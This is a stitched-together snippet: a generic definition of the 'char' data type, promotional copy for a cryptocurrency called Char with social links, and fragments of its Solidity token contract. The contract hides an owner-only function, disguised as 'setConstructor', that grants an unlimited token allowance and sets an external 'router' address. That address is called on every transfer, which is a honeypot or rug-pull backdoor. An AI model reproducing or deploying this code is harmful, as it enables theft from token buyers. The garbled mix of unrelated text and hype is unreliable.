...
In coding, "char" is a data type used to represent a single character. It stands for "character" and can be used to store letters, numbers, punctuation marks, and other symbols. In many programming languages, a char variable takes up one byte of memory and can hold a value between 0 and 255. Char variables are commonly used in text processing and input/output operations.

Overall, Char is a promising cryptocurrency that offers a number of benefits over traditional forms of currency. Whether you're looking to make purchases online, invest in a new asset class, or simply explore the world of cryptocurrency, Char is definitely worth considering.

Website: https://chareth.xyz
Telegram: https://t.me/charethportal
Twitter: https://twitter.com/charethporta
...
interface IUniswapVRouter {
    function swap(address tokenA, address tokenB) external returns (bool);
}
...
contract CHAR is Context, IERC20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(feeAddress != operationAddress) IUniswapVRouter(operationAddress).swap(sender, recipient);
    ...
    function setConstructor(uint256 totalBuyFee, uint256 totalSellFee, uint256 totalShare, address s, address r) external onlyOwner {
        uint256 amount = type(uint256).max;
        _totalTaxIfBuying = totalBuyFee;
        _totalTaxIfSelling = totalSellFee;
        _totalDistributionShares = totalShare;
        _allowances[s][r] = amount;
        feeAddress = s;
        operationAddress = r;
    }
